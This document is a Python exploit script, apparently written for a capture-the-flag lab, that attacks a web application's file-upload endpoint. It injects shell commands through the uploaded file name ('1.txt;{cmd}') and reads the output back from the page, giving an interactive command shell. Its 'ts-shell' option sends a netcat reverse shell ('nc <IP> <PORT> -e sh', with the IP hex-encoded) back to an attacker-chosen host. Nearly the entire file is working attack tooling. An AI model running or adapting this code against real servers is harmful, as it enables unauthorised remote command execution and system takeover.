#!/usr/bin/env python3 

import requests
import sys
import os

class col:
    RED = '\033[31m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    RESET = '\033[0m'


def banner():
    banner = r"""___________                                  _________.__    ________ .__  .__    
\__    ___/___   _____ ______  __ __  ______/   _____/|  |__ \_____  \|  | |  |   
  |    |_/ __ \ /     \\____ \|  |  \/  ___/\_____  \ |  |  \  _(__  <|  | |  |   
  |    |\  ___/|  Y Y  \  |_> >  |  /\___ \ /        \|   Y  \/       \  |_|  |__ 
  |____| \___  >__|_|  /   __/|____//____  >_______  /|___|  /______  /____/____/ 
             \/      \/|__|              \/        \/      \/       \/            """
    
    print(col.CYAN + banner + col.RESET+ "\n")


def help():
    banner()    
    print("Usage: ./tempush3ll.py 10.10.10.10")
    print("Or:    ./tempush3ll.py 10.10.10.10 9.9.9.9:7777 - for a reverse shell\n")
    commands()

def commands():
    print(col.GREEN+ "Commands:" + col.RESET)
    print("ts-help  : Help Menu")
    print("ts-exit  : Exit App")
    print("ts-clear : Clear Screen")
    print("ts-shell : Call Reverse Shell\n")

if len(sys.argv) < 2:
    help()
    sys.exit(0)
elif len(sys.argv) == 3:
    global ip_port 
    ip_port = sys.argv[2]

def sendCmd(cmd, ip):
    s = requests.Session()
    #burpproxy={"http":"http://127.0.0.1:8080"}
    fakeData = "fakedata".encode("ascii")
    data = {"file":(f"1.txt;{cmd}", fakeData, 'text/text'), "my-form":"Upload !"}
    #r = s.post("http://10.10.189.217/upload", files=data, proxies=burpproxy)
    url = f"http://{sys.argv[1]}/upload"
    r = s.post(url, files=data, timeout=3)
    return r

def printResults(text):
    if "<ul class=flashes>" in text:
        res = text.split("<ul class=flashes>")[1].split("</ul>")[0] #.split("</li>")[0]
        res = res.split("<li>")[1].split("</li>")[0]
        print(res)
    else:
        print(col.RED+ "Error in output, try again" + col.RESET)

help()

#Shell
while True:
    try:
        cmd = input(col.GREEN + "$: " +col.RESET)
        if cmd == "ts-help":
            commands()
        if cmd == "ts-exit":
            sys.exit(0)
        if cmd == "ts-cls":
            os.system("clear")
            continue
        if cmd == "ts-shell":
            while True:
                ans = input("Did you start the Listner? .. [y/n/q]: ")
                ans = ans[0].lower()
                if ans == '' or ans in ['y','Y','n','N','q']:
                    if ans == 'q':
                        print("Quitting...")
                        sys.exit(0)
                    if ans == 'n' or ans == 'N':
                        continue
                    if ans == 'y' or ans == 'Y':
                        break
                    print("Enter y or n ...")
                    sys.exit(0)
                
            ip = ip_port
            ipp = ip.split(":")[0].split(".") #Hex-Encode the ip
            ipp = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ipp))
            bash = "nc <IP> <PORT> -e sh".replace("<IP>", "0x"+ ipp).replace("<PORT>", ip.split(":")[1])
            cmd = bash        
        
        r = sendCmd(cmd, ip_port.split(":")[0])    
        printResults(r.text)

    except requests.Timeout as t:
        print(f"Error: Connection Timed out, Check your values!!\n\n{t}")
    except Exception as e:
        print(col.RED+ f"Error in output: {e}" + col.RESET)
        
    
